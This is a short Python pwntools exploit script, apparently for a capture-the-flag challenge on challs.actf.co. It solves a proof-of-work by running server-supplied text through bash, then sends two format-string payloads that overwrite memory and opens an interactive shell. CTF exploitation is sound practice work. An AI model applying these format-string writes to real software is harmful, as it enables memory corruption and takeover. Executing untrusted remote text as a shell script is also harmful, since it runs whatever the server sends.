from pwn import *

DEBUG = 0

if DEBUG:
    io = process('./chall')
else:
    io = remote('challs.actf.co', 31400)

def pow():
    io.recvuntil(b'work: ')
    with open('run.sh', 'wb') as f:
        f.write(io.recvline())
    res = subprocess.run(['bash', './run.sh'], capture_output=True)
    io.sendlineafter(b'solution: ', res.stdout)

def pwn():
    pl = b'%*d%56c%13$n'
    io.sendlineafter(b'leek? ', pl)
    pl = b'%*12$d%678166c%42$n'
    if DEBUG:
        gdb.attach(io, gdbscript='''
        b * main+248
        continue
        ''')
    io.sendlineafter(b'more leek? ', pl)
if not DEBUG:
    pow()
pwn()
io.interactive()
